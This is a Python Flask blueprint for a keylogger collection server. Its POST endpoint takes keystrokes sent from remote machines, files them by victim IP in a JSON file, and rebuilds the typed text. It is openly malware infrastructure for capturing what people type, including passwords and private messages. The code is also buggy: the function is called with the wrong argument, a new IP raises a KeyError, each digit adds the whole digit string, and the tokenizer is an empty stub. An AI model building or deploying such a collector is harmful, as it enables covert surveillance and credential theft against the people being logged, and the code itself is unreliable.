
from flask import Blueprint, request
import json
from typing import List
import string
import os
keylog: Blueprint = Blueprint('keylog', __name__, None)

data_file: str = "data/keylog.json"


@keylog.route('/keylogger/send_data', methods=['POST'])
def record() -> dict:
    """
    A POST route to allow a key logger to send its data to the server.

    Return:
    A dict, with a key for the response. 0 if successful.
    """
    data: dict = json.loads(request.json)

    ip: str = request.remote_addr
    letters: List[str] = data['keys_pressed']

    data_file: str = "data/keylog.json"
    if os.path.exists(data_file):
        with open(data_file, "r") as fp:
            data = json.load(fp)
    else:
        data = {}

    previous_string: str = ''
    if ip in data.keys():
        previous_string = data[ip]['string']

    previous_string += process_key_string(letters)
    data[ip]["string"] = previous_string
    data[ip]["frequency_map"] = {}

    with open(data_file, "w+") as fp:
        json.dump(data, fp)

    return {"response": 0}


def process_key_string(ip: str) -> str:
    """
    Return a string of an attempt to convert a string of keyboard input to the words typed.

    Arguments:
        ip: the ip address of the machine to grab the keys for.

    Return:
        the string version of the keyboard input
    """
    data: dict = None
    with open(data_file, 'r') as fp:
        data = json.load(fp)

    keys: List[str] = data[ip]
    result: str = ''

    for key in keys:
        if key in string.ascii_letters:
            result += key
        elif key in string.digits:
            result += string.digits
        elif key == 'space' or key == 'enter':
            result += ' '
        elif key == 'shift':
            result += ' <shift> '
        elif key == 'backspace':
            result = result[0:-1]
        elif key == '.' or key == ',':
            result += key
        else:
            print(key)
    return result


def tokenize(data: str, seperators: List[str]) -> List[str]:
    """
    Converts the given data into a list of tokens based on the given seperators.

    Arguments:
        data: the string to be tokenized
        seperators: a list of the seperators to seperate tokens on.

    Return: 
        A list of tokens representing words.
    """
    pass


print(process_key_string('127.0.0.1'))
